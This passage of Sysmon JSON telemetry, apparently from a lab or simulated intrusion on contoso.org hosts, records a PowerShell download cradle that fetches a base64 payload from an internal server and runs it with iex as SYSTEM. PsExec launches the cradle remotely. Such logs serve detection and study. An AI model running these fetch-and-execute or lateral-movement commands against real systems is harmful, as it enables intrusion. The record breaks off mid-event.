        {
            "action": "create",
            "command_line": "powershell.exe  -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content.Split()[-1] )))\"",
            "event_id": "daf3b13695577bde0159e25387ae36405419c209fa0b61e97d8157e4dc7674d0",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:32.135Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "FF59EF73460173ABDB10EDE1A0BC9CE6",
                "SHA256": "34507738F84B9D4F231DC0C187FEE4A03B4DDB84CF63FF56A4A1761A9BD56EA6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "daf3b13695577bde0159e25387ae36405419c209fa0b61e97d8157e4dc7674d0",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "\"cmd\" /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content.Split()[-1] )))\"",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\System32\\cmd.exe",
            "parent_process_guid": "{DD483508-ED48-5F6C-0000-0010FB86B401}",
            "pid": 5704,
            "ppid": 3456,
            "process_guid": "{DD483508-ED48-5F6C-0000-0010838EB401}",
            "record_number": "4098350",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:02:32.137Z",
            "timestamp": 1600974152137,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-ED48-5F6C-0000-0010838EB401}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 19:02:32.663",
            "event_id": "46bfa7e17a431a07c084788998f7eaf3c84cf38fabf8484f2ee10e07b0b25ee5",
            "event_type": "file",
            "event_utc": "2020-09-24T19:02:32.663Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_3esxaqqw.r50.ps1",
            "file_path": "C:\\Windows\\Temp\\__PSScriptPolicyTest_3esxaqqw.r50.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "46bfa7e17a431a07c084788998f7eaf3c84cf38fabf8484f2ee10e07b0b25ee5",
            "image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 5704,
            "process_guid": "{DD483508-ED48-5F6C-0000-0010838EB401}",
            "record_number": "4098351",
            "subtype": "create",
            "time": "2020-09-24T19:02:32.676Z",
            "timestamp": 1600974152676,
            "uuid": "{DD483508-ED48-5F6C-0000-0010838EB401}"
        },
        {
            "action": "terminate",
            "event_id": "cab9ff22a137d74b454ccbd5fa67b3bda483a864279e8fe578e23b761682767e",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:33.257Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "cab9ff22a137d74b454ccbd5fa67b3bda483a864279e8fe578e23b761682767e",
            "image_path": "C:\\Windows\\System32\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 3456,
            "process_guid": "{DD483508-ED48-5F6C-0000-0010FB86B401}",
            "record_number": "4098353",
            "subtype": "terminate",
            "time": "2020-09-24T19:02:33.265Z",
            "timestamp": 1600974153265,
            "uuid": "{DD483508-ED48-5F6C-0000-0010FB86B401}"
        },
        {
            "action": "terminate",
            "event_id": "06e858980c1db880ded4bcc8011c69485f110c8cd8d3f7700f47ed35b6962ad5",
            "event_type": "process",
            "event_utc": "2020-09-24T19:02:33.444Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "06e858980c1db880ded4bcc8011c69485f110c8cd8d3f7700f47ed35b6962ad5",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 4092,
            "process_guid": "{DD483508-ED47-5F6C-0000-0010B041B401}",
            "record_number": "4098358",
            "subtype": "terminate",
            "time": "2020-09-24T19:02:33.451Z",
            "timestamp": 1600974153451,
            "uuid": "{DD483508-ED47-5F6C-0000-0010B041B401}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-67.contoso.org",
            "dest_hostname": "srv-dc-67",
            "dest_ip": "10.0.0.9",
            "dest_ipv6": "false",
            "dest_port": 389,
            "event_id": "34a4a5e9339eafa22a1c0f97abf72de59d946e91a433e3af21df86b4e193a66f",
            "event_type": "flow",
            "event_utc": "2020-09-24T19:03:09.744Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "34a4a5e9339eafa22a1c0f97abf72de59d946e91a433e3af21df86b4e193a66f",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4098374",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 53636,
            "subtype": "start",
            "time": "2020-09-24T19:02:58.724Z",
            "timestamp": 1600974178724,
            "transport": "udp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-dc-67.contoso.org",
            "dest_hostname": "srv-dc-67",
            "dest_ip": "10.0.0.9",
            "dest_ipv6": "false",
            "dest_port": 88,
            "event_id": "3523a9ab6d8c591913f1cf674c6d49eec7fc471170faf349370ec6fdc791f926",
            "event_type": "flow",
            "event_utc": "2020-09-24T19:03:10.126Z",
            "exe": "lsass.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3523a9ab6d8c591913f1cf674c6d49eec7fc471170faf349370ec6fdc791f926",
            "image_path": "C:\\Windows\\System32\\lsass.exe",
            "initiated": true,
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "flow",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4098377",
            "src_fqdn": "cmp-535872.contoso.org",
            "src_hostname": "cmp-535872",
            "src_ip": "10.0.0.3",
            "src_ipv6": "false",
            "src_port": 65026,
            "subtype": "start",
            "time": "2020-09-24T19:02:58.725Z",
            "timestamp": 1600974178725,
            "transport": "tcp",
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "creation_time": "2019-02-19 00:26:54.882",
            "event_id": "c4f501517fade759c9756e98ee355c50bde2d5fa2156676fcc9d8c753780b5c0",
            "event_type": "file",
            "event_utc": "2020-09-24T19:11:02.229Z",
            "exe": "lsass.exe",
            "file_name": "netlogon.ftl",
            "file_path": "C:\\Windows\\System32\\config\\netlogon.ftl",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "c4f501517fade759c9756e98ee355c50bde2d5fa2156676fcc9d8c753780b5c0",
            "image_path": "C:\\windows\\system32\\lsass.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 788,
            "process_guid": "{DD483508-D8C0-5F6C-0000-001017C10000}",
            "record_number": "4098627",
            "subtype": "create",
            "time": "2020-09-24T19:11:02.232Z",
            "timestamp": 1600974662232,
            "uuid": "{DD483508-D8C0-5F6C-0000-001017C10000}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe -s /accepteula \\\\cmp-535872 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "event_id": "a6f7ee65ac2b9c4c0f42b22c632e2aefe8d1d01b83431a7630333c38bb740047",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:43.983Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8FAFBE3C23E2BE4D6A3C063118B9A4F2",
                "SHA256": "4C3EA4C44AAB74350355C419826B8C9E6172C3BD8F0BB5817ECF7BE50B629051"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "a6f7ee65ac2b9c4c0f42b22c632e2aefe8d1d01b83431a7630333c38bb740047",
            "image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "pid": 9524,
            "ppid": 3544,
            "process_guid": "{DD483508-F4D3-5F6C-0000-00106BCB3002}",
            "record_number": "4099102",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T19:34:43.990Z",
            "timestamp": 1600976083990,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-F4D3-5F6C-0000-00106BCB3002}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\wow64.dll+14591|C:\\windows\\System32\\wow64.dll+13d83|C:\\windows\\System32\\wow64.dll+6523|C:\\windows\\System32\\wow64cpu.dll+1923|C:\\windows\\System32\\wow64.dll+1aefc|C:\\windows\\System32\\wow64.dll+bea0|C:\\windows\\SYSTEM32\\ntdll.dll+792b8|C:\\windows\\SYSTEM32\\ntdll.dll+78e3b|C:\\windows\\SYSTEM32\\ntdll.dll+78dee|C:\\windows\\SYSTEM32\\ntdll.dll+702fc(wow64)|C:\\windows\\System32\\KERNELBASE.dll+d3a96(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189dbb(wow64)|C:\\windows\\System32\\KERNELBASE.dll+189a6c(wow64)|C:\\Program Files\\Windows Event Reporting\\Core\\EventReporting.ApplicationFilter.Monitor.Win32.dll+31c2(wow64)|UNKNOWN(0000000071971000)|UNKNOWN(000000000C6064BB)|UNKNOWN(000000000C6065D3)|UNKNOWN(000000000C60672B)|UNKNOWN(000000000C601965)|UNKNOWN(000000000C601A87)|UNKNOWN(000000000C6071CC)|UNKNOWN(000000000C600506)|UNKNOWN(000000000C6078A8)",
            "event_id": "0e3ac71fbafc5ae53fc6c42fcae881a88aa280d2679fc2ddf4ae2f3e786c104a",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:43.982Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "0e3ac71fbafc5ae53fc6c42fcae881a88aa280d2679fc2ddf4ae2f3e786c104a",
            "image_path": "C:\\windows\\SysWOW64\\cmd.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 9524,
            "process_guid": "{DD483508-F4D3-5F6C-0000-00106BCB3002}",
            "record_number": "4099103",
            "src_exe": "powershell.exe",
            "src_image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "src_pid": "3544",
            "src_process_guid": "{DD483508-E26C-5F6C-0000-0010E0300501}",
            "subtype": "access",
            "time": "2020-09-24T19:34:43.990Z",
            "timestamp": 1600976083990,
            "uuid": "{DD483508-F4D3-5F6C-0000-00106BCB3002}"
        },
        {
            "action": "create",
            "command_line": "C:\\Users\\Public\\PsExec64.exe  -s /accepteula \\\\cmp-535872 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "event_id": "752bcd5bf76dce6893345455e93cdddbfe09aca7e74f1fbb5895f63919856cb3",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:44.255Z",
            "exe": "PsExec64.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "9321C107D1F7E336CDA550A2BF049108",
                "SHA256": "AD6B98C01EE849874E4B4502C3D7853196F6044240D3271E4AB3FC6E3C08E9A4"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "752bcd5bf76dce6893345455e93cdddbfe09aca7e74f1fbb5895f63919856cb3",
            "image_path": "C:\\Users\\Public\\PsExec64.exe",
            "integrity_level": "High",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{E0425724-A193-46EB-8062-B64C378337CC}",
            "logon_id": "0xf28ca3",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "psexec.c",
            "parent_command_line": "C:\\windows\\system32\\cmd.exe /C C:\\Users\\Public\\PsExec64.exe -s /accepteula \\\\cmp-535872 cmd /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\SysWOW64\\cmd.exe",
            "parent_process_guid": "{DD483508-F4D3-5F6C-0000-00106BCB3002}",
            "pid": 4304,
            "ppid": 9524,
            "process_guid": "{DD483508-F4D4-5F6C-0000-00109AE43002}",
            "record_number": "4099104",
            "subtype": "create",
            "terminal_session_id": "1",
            "time": "2020-09-24T19:34:44.261Z",
            "timestamp": 1600976084261,
            "user": "CONTOSO\\MCASEY",
            "uuid": "{DD483508-F4D4-5F6C-0000-00109AE43002}"
        },
        {
            "action": "create",
            "command_line": "C:\\windows\\PSEXESVC.exe",
            "event_id": "620c132a332185d2197f9eef0216bca657006be6844963d3689d441e8be7a825",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:44.343Z",
            "exe": "PSEXESVC.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "AE5BB9F3FFF1AEAAAD619BAB105B2391",
                "SHA256": "224F549F33854ED53667055786DC1073E64B7428FAE26F27DAB9828ED502BB99"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "620c132a332185d2197f9eef0216bca657006be6844963d3689d441e8be7a825",
            "image_path": "C:\\Windows\\PSEXESVC.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "psexesvc.exe",
            "parent_command_line": "C:\\windows\\system32\\services.exe",
            "parent_exe": "services.exe",
            "parent_image_path": "C:\\Windows\\System32\\services.exe",
            "parent_process_guid": "{DD483508-D8C0-5F6C-0000-0010C7BD0000}",
            "pid": 9960,
            "ppid": 780,
            "process_guid": "{DD483508-F4D4-5F6C-0000-001091F53002}",
            "record_number": "4099107",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:34:44.346Z",
            "timestamp": 1600976084346,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D4-5F6C-0000-001091F53002}"
        },
        {
            "action": "create",
            "command_line": "\"cmd\" /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "event_id": "d8b20e378ae0cb90772bb65bcdefd8c3c4d41e705ab8d1831b11008724bd3537",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:44.488Z",
            "exe": "cmd.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "E08FE2DE3DDD22123247D49A11B4F53D",
                "SHA256": "EC436AEEE41857EEE5875EFDB7166FE043349DB5F58F3EE9FC4FF7F50005767F"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "d8b20e378ae0cb90772bb65bcdefd8c3c4d41e705ab8d1831b11008724bd3537",
            "image_path": "C:\\Windows\\System32\\cmd.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "Cmd.Exe",
            "parent_command_line": "C:\\windows\\PSEXESVC.exe",
            "parent_exe": "PSEXESVC.exe",
            "parent_image_path": "C:\\Windows\\PSEXESVC.exe",
            "parent_process_guid": "{DD483508-F4D4-5F6C-0000-001091F53002}",
            "pid": 4188,
            "ppid": 9960,
            "process_guid": "{DD483508-F4D4-5F6C-0000-001026043102}",
            "record_number": "4099122",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:34:44.506Z",
            "timestamp": 1600976084506,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D4-5F6C-0000-001026043102}"
        },
        {
            "action": "create",
            "command_line": "powershell.exe  -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "event_id": "50fb16f4369a70a11a94d0bcfac82d6f0f9f70a00315f4938bff385d2afbc91f",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:44.570Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "FF59EF73460173ABDB10EDE1A0BC9CE6",
                "SHA256": "34507738F84B9D4F231DC0C187FEE4A03B4DDB84CF63FF56A4A1761A9BD56EA6"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "50fb16f4369a70a11a94d0bcfac82d6f0f9f70a00315f4938bff385d2afbc91f",
            "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "\"cmd\" /c powershell.exe -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "parent_exe": "cmd.exe",
            "parent_image_path": "C:\\Windows\\System32\\cmd.exe",
            "parent_process_guid": "{DD483508-F4D4-5F6C-0000-001026043102}",
            "pid": 10504,
            "ppid": 4188,
            "process_guid": "{DD483508-F4D4-5F6C-0000-0010CA103102}",
            "record_number": "4099123",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:34:44.576Z",
            "timestamp": 1600976084576,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D4-5F6C-0000-0010CA103102}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 19:34:45.388",
            "event_id": "a334100223b64a437466c3a714c86289599b8b8d471877d39b105ba87359ac00",
            "event_type": "file",
            "event_utc": "2020-09-24T19:34:45.388Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_ozkmvncu.2ot.ps1",
            "file_path": "C:\\Windows\\Temp\\__PSScriptPolicyTest_ozkmvncu.2ot.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "a334100223b64a437466c3a714c86289599b8b8d471877d39b105ba87359ac00",
            "image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 10504,
            "process_guid": "{DD483508-F4D4-5F6C-0000-0010CA103102}",
            "record_number": "4099126",
            "subtype": "create",
            "time": "2020-09-24T19:34:45.404Z",
            "timestamp": 1600976085404,
            "uuid": "{DD483508-F4D4-5F6C-0000-0010CA103102}"
        },
        {
            "action": "access",
            "call_trace": "C:\\windows\\SYSTEM32\\ntdll.dll+a18c4|C:\\windows\\System32\\KERNELBASE.dll+1075a|C:\\windows\\System32\\KERNELBASE.dll+d846|C:\\windows\\System32\\KERNEL32.DLL+1c6e3|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\78b8fb2c58a4cdcc3a44547b9bbd80b9\\System.ni.dll+3332f6|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\78b8fb2c58a4cdcc3a44547b9bbd80b9\\System.ni.dll+2b5560|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\78b8fb2c58a4cdcc3a44547b9bbd80b9\\System.ni.dll+2b4f07|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e7d2676|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1ea05093|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e884ee5|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e6c61dd|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e8862bb|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e88610c|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e88828a|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e714f29|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e70fc2b|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e8a9794|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e708c93|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e708d6b|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e708343|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e8779eb|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e8774a9|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e916d85|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\1a154cf510e9318bf741d36a60350e5d\\System.Management.Automation.ni.dll+1e5cb3af",
            "event_id": "5beec9515aea4b152c6012ae21555909002d9b818f790633949857fe80a19265",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:46.747Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "granted_access": "0x1fffff",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "5beec9515aea4b152c6012ae21555909002d9b818f790633949857fe80a19265",
            "image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "process",
            "pid": 2296,
            "process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "record_number": "4099137",
            "src_exe": "powershell.exe",
            "src_image_path": "C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "src_pid": "10504",
            "src_process_guid": "{DD483508-F4D4-5F6C-0000-0010CA103102}",
            "subtype": "access",
            "time": "2020-09-24T19:34:46.755Z",
            "timestamp": 1600976086755,
            "uuid": "{DD483508-F4D6-5F6C-0000-001059723102}"
        },
        {
            "action": "create",
            "command_line": "\"c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\" -Version 5.1 -s -NoLogo -NoProfile",
            "decoded_command_line": "",
            "event_id": "7065d2f47b41df11a5bbac6636cd00d3cd1c11af4ae14a99f1c334d3b17cdc5d",
            "event_type": "process",
            "event_utc": "2020-09-24T19:34:46.749Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "hash": {
                "MD5": "8F928AF9C3A8CE4244556AAF3AE31B10",
                "SHA256": "67715009A6373ACC7C2BB491D93C3EDDD3D0F989C4C2FB60618E056898E60E49"
            },
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "7065d2f47b41df11a5bbac6636cd00d3cd1c11af4ae14a99f1c334d3b17cdc5d",
            "image_path": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
            "integrity_level": "System",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "logon_guid": "{DD483508-D8C0-5F6C-0000-0020E7030000}",
            "logon_id": "0x3e7",
            "nodetype": "event",
            "object": "process",
            "original_file_name": "PowerShell.EXE",
            "parent_command_line": "powershell.exe  -NonInteractive -NoProfile \"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( (wget http://srv-sft-update-38/download/readme.txt -UseBasicParsing).Content)))\"",
            "parent_exe": "powershell.exe",
            "parent_image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_process_guid": "{DD483508-F4D4-5F6C-0000-0010CA103102}",
            "pid": 2296,
            "ppid": 10504,
            "process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "record_number": "4099136",
            "subtype": "create",
            "terminal_session_id": "0",
            "time": "2020-09-24T19:34:46.755Z",
            "timestamp": 1600976086755,
            "user": "NT AUTHORITY\\SYSTEM",
            "uuid": "{DD483508-F4D6-5F6C-0000-001059723102}"
        },
        {
            "action": "create",
            "creation_time": "2020-09-24 19:34:47.638",
            "event_id": "b1eb1449f4e883896472784f4740a0e263d9635f8b00b5a5c8a4b209f1f7c583",
            "event_type": "file",
            "event_utc": "2020-09-24T19:34:47.638Z",
            "exe": "powershell.exe",
            "file_name": "__PSScriptPolicyTest_1bb1l2c4.rhk.ps1",
            "file_path": "C:\\Windows\\Temp\\__PSScriptPolicyTest_1bb1l2c4.rhk.ps1",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "b1eb1449f4e883896472784f4740a0e263d9635f8b00b5a5c8a4b209f1f7c583",
            "image_path": "c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe",
            "log_name": "Microsoft-Windows-Sysmon/Operational",
            "nodetype": "event",
            "object": "file",
            "pid": 2296,
            "process_guid": "{DD483508-F4D6-5F6C-0000-001059723102}",
            "record_number": "4099138",
            "subtype": "create",
            "time": "2020-09-24T19:34:47.646Z",
            "timestamp": 1600976087646,
            "uuid": "{DD483508-F4D6-5F6C-0000-001059723102}"
        },
        {
            "action": "start",
            "count": 0,
            "dest_fqdn": "srv-sft-update-38.contoso.org",
            "dest_hostname": "srv-sft-update-38",
            "dest_ip": "10.0.0.8",
            "dest_ipv6": "false",
            "dest_port": 80,
            "event_id": "3e7ce29245ed268e80c9fb99255f45fd16da395a05c31808bafdda24137bd118",
            "event_type": "flow",
            "event_utc": "2020-09-24T19:34:58.554Z",
            "exe": "powershell.exe",
            "fqdn": "cmp-535872.contoso.org",
            "host": "cmp-535872",
            "hostname": "cmp-535872",
            "id": "3e7ce29245ed268e80c9fb99255f45fd16da395a05c31808bafdda24137bd118",
